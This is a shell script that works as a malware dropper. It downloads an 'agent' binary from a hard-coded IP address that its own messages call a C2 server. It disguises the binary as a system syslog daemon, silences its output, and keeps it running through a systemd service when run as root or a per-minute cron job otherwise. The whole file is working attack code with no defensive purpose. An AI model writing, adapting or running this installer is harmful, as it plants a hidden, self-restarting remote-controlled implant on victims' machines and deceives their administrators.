#!/bin/sh

VPS_DOWNLOAD_URL="http://144.31.53.212/download/agent"
PROCESS_NAME="syslog-service"
LOCK_FILE="/tmp/agent.lock"

echo "[*] Starting installation of $PROCESS_NAME..."

if [ "$(id -u)" -eq 0 ]; then
    INSTALL_DIR="/usr/local/bin"
    PERSISTENCE_TYPE="systemd"
    echo "[+] Running as root. Will use systemd persistence."
else
    INSTALL_DIR="$HOME"
    PERSISTENCE_TYPE="cron"
    echo "[+] Running as user $(whoami) (UID: $(id -u)). Will use cron persistence."
fi

TARGET_PATH="$INSTALL_DIR/$PROCESS_NAME"

echo "[*] Cleaning up old processes and services..."
if [ "$PERSISTENCE_TYPE" = "systemd" ]; then
    systemctl stop "$PROCESS_NAME" 2>/dev/null || true
    systemctl disable "$PROCESS_NAME" 2>/dev/null || true
fi

killall "$PROCESS_NAME" 2>/dev/null || pkill -f "$PROCESS_NAME" 2>/dev/null || true
killall agent 2>/dev/null || pkill agent 2>/dev/null || true

rm -f "$LOCK_FILE"

echo "[*] Downloading new agent from C2 VPS..."
DOWNLOAD_SUCCESS=0

if command -v curl >/dev/null 2>&1; then
    curl -sSL -m 30 "$VPS_DOWNLOAD_URL" -o "/tmp/$PROCESS_NAME" && DOWNLOAD_SUCCESS=1
elif command -v wget >/dev/null 2>&1; then
    wget -q --timeout=30 -O "/tmp/$PROCESS_NAME" "$VPS_DOWNLOAD_URL" && DOWNLOAD_SUCCESS=1
fi

if [ $DOWNLOAD_SUCCESS -ne 1 ] || [ ! -f "/tmp/$PROCESS_NAME" ]; then
    echo "[-] Download failed! Cannot connect to C2 VPS."
    exit 1
fi

FILE_SIZE=$(wc -c </tmp/$PROCESS_NAME)
if [ "$FILE_SIZE" -lt 1000000 ]; then
    echo "[-] Downloaded file is too small ($FILE_SIZE bytes). Download failed or file corrupted."
    rm -f "/tmp/$PROCESS_NAME"
    exit 1
fi

chmod +x "/tmp/$PROCESS_NAME"
mv "/tmp/$PROCESS_NAME" "$TARGET_PATH"
echo "[+] Agent binary placed at $TARGET_PATH"

if [ "$PERSISTENCE_TYPE" = "systemd" ]; then
    SERVICE_FILE="/etc/systemd/system/$PROCESS_NAME.service"
    echo "[*] Creating systemd service at $SERVICE_FILE..."
    
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Syslog Service Daemon
After=network.target

[Service]
Type=simple
ExecStart=$TARGET_PATH
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$PROCESS_NAME"
    systemctl start "$PROCESS_NAME"
    echo "[+] Systemd service enabled and started."

else
    echo "[*] Configuring user cronjob..."
    CRON_LINE="* * * * * pgrep -f '$PROCESS_NAME' >/dev/null || nohup $TARGET_PATH >/dev/null 2>&1 &"
    
    (crontab -l 2>/dev/null | grep -F "$PROCESS_NAME" >/dev/null)
    if [ $? -ne 0 ]; then
        (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab -
        echo "[+] Cronjob added successfully."
    else
        echo "[*] Cronjob already exists."
    fi
    
    nohup "$TARGET_PATH" >/dev/null 2>&1 &
    echo "[+] Agent launched in background."
fi

echo "[+] Installation and persistence configured successfully!"
